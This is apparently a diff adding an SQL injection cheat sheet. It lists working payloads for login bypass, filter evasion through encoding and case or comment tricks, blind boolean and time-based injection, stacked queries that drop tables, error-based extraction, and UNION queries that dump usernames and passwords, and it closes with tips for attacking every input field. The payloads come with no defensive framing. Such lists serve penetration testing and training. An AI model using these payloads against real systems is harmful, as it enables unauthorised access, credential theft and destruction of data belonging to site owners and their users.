@@ -1,0 +1,100 @@
+Authentication Bypass: 
+Common Payload:
+
+' OR '1'='1' --  
+' OR 1=1#  
+admin' --  
+admin'/*
+
+
+Tautology-Based Injection:
+Examples:
+
+' OR 1=1 --  
+' OR 'a'='a'
+
+
+Comment-Based Injection:
+Common Comments:
+
+--  
+#  
+/*
+
+
+Encoding-Based Bypass:
+Circumvent Filters with encoding tricks.
+
+Payload Encoding Types:
+
+%27 (URL encoding ')
+%2D%2D (encoding --)
+Double encoding: %2527
+
+Example:
+%27%20OR%201%3D1--%20
+
+Whitespace & Case Variation:
+Bypasses filters using obfuscation
+
+Examples:
+UN/**/ION/**/SELECT  
+SeLeCT * FrOm users
+
+Spaces can be replace with:
+Tabs \t
+Comments /**/
+Newlines \n
+
+Blind SQL Injection: used when there's no visible error - only behavioral changes.
+
+Boolean Based:
+' AND 1-1 --
+
+Time-Based (MYSQL):
+' OR IF(1=1, SLEEP(5), 0) --
+
+Tools like sqlmap excels here.
+
+
+Stacked Queries:
+Execute multiple SQL Commands in one line.
+Payloads:
+
+'; DROP TABLE users; --
+
+
+Error-Based SQLI:
+Forces DB to reveal internal errors.
+
+Examples:
+' AND 1=CONVERT(int, (SELECT @@version)) --  
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(user,0x3a,pass) FROM users GROUP BY 1) a) --
+
+
+Union-Based Injection:
+Merge queries and dump data.
+
+Payloads:
+' UNION SELECT null, username, password FROM users --
+
+Use ORDER BY to find column count before using UNION.
+
+
+Advanced Techniques:
+Concatenation Bypass:
+' OR 'a' + 'a'='aa' --  (MSSQL)
+
+
+Version/DB info extraction:
+' UNION SELECT version() --  (MySQL)  
+' UNION SELECT @@version --  (MSSQL)
+
+Final Notes:
+Test all input fields (GET, POST, Cookies, Headers).
+Use proxy tools to intercept and replay requests.
+Always encode your payloads correctly.
+Combine techniques creatively — no single payload fits all.
+
+
+
